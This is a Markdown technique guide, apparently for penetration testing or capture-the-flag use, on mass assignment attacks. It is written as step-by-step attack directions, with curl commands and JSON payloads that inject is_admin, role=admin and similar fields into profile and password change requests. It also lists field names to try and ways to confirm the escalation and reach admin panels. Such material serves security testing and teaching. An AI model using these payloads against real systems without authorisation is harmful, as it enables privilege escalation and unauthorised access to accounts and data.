# Mass Assignment

## When this applies

- Endpoint that updates a user, profile, or object accepts a JSON/form body with multiple fields.
- Server uses bulk-bind / mass-assign patterns (Rails `permit!`, Express `Object.assign(user, req.body)`, Django `**request.POST`, ASP.NET model-binding).
- Frontend only sends a subset of fields — privileged fields (role, is_admin) exist on the model but aren't normally exposed.

## Technique

Add privilege-related fields to update requests. Common targets: `is_admin`, `role`, `is_staff`, `is_superuser`, `privilege`, `level`, `verified`, `email_verified`, `balance`. The server blindly assigns the field if its ORM/binder permits all attributes.

## Steps

When any endpoint updates a user, profile, or object:
- Add `is_admin=true` (or `role=admin`, `is_staff=1`, `is_superuser=true`) to update POST/PUT/PATCH
- Try both form-encoded (`is_admin=true`) and JSON (`{"is_admin": true}`) formats
- Common field names: `is_admin`, `isAdmin`, `admin`, `role`, `is_staff`, `is_superuser`, `privilege`, `level`, `type`, `group`, `verified`
- Check if GET and POST edit endpoints have different authorization — POST may lack the IDOR check
- After escalation, access admin-only content (private items, admin panels, restricted APIs)
- Read source code or API schemas to discover all model fields
- **Password change forms** — intercept password change submissions; the backend may use `permit!` (Rails) or unfiltered `params` allowing injection of `role`, `admin`, or other privilege fields alongside the password
- Check if the password change endpoint uses AJAX (intercept traffic to find the actual URL, e.g., `/admin/users/<ID>/updated_ajax`)

**Password Change Form Mass Assignment:**
```bash
# Intercept the password change form submission — find the actual AJAX endpoint
# Normal: password[current]=old&password[new]=new123&password[confirm]=new123
# Attack: add role parameter nested under the same object
curl -X POST /admin/users/1/updated_ajax \
  -d "password[current]=old&password[new]=new123&password[confirm]=new123&password[role]=admin"

# Rails-specific: if controller uses params.require(:password).permit! — ALL nested params are accepted
# Also try: user[role]=admin, user[admin]=true, user[is_admin]=1
```

**Example:**
```bash
# Normal profile update (UI sends only name)
curl -X POST /edit_profile/1 -d "name=demo"

# Mass assignment attack (add is_admin parameter)
curl -X POST /edit_profile/1 -d "name=demo&is_admin=true"

# JSON variant
curl -X PUT /api/profile -H "Content-Type: application/json" -d '{"name":"demo","role":"admin"}'
```

JSON parameter injection:
```json
# Original
{"email": "user@test.com"}

# Injected
{"email": "user@test.com", "role": "admin"}
{"email": "user@test.com", "isAdmin": true}
{"email": "user@test.com", "roleid": 2}
```

| Parameter | Common Values | Location |
|-----------|--------------|----------|
| Admin | true, false, 1, 0 | Cookie, JSON |
| role | admin, user, guest | Cookie, JSON, Form |
| roleid | 1, 2, 3 | JSON, Form |
| isAdmin | true, false | JSON, Cookie |
| user_level | 1-10 | Cookie, JSON |
| privilege | admin, high, low | JSON, Form |
| id | numbers, GUIDs | URL, Form |
| user_id | numbers, GUIDs | URL, JSON |
| username | strings | URL, Form |

## Verifying success

- Re-fetching the user/profile shows the new privileged value (e.g., `"is_admin": true`).
- Admin-only endpoints become accessible after the mass-assign request.
- Private items / admin dashboards now visible to your account.

## Common pitfalls

- Some frameworks silently strip unknown fields — try BOTH naming conventions (`is_admin` AND `isAdmin` AND `admin`).
- Nested objects matter: Rails `params.require(:user).permit!` lets you inject under `user[role]`, not at top level.
- Some apps validate the assigned value; `role: "admin"` may be rejected but `role: 1` (numeric) accepted.
- The privileged field may not appear in API responses — check by attempting an admin action after the update.

## Tools

- Burp Suite Repeater
- Burp Param Miner (header/parameter discovery)
- curl
- Source-code reading (model definitions, controller `permit` calls)
